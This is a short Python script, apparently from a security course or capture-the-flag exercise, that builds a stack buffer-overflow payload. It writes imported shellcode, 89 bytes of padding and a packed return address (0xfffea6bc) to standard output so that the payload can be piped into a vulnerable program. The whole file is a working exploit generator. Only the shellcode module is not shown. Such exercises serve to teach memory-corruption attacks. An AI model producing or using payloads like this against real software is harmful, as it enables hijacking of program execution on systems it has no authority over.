from struct import pack 
from shellcode import shellcode
import sys
padding = 89
inj = ('\x12'*padding).encode('ASCII')+pack("<I", 0xfffea6bc)
sys.stdout.buffer.write(shellcode+inj)
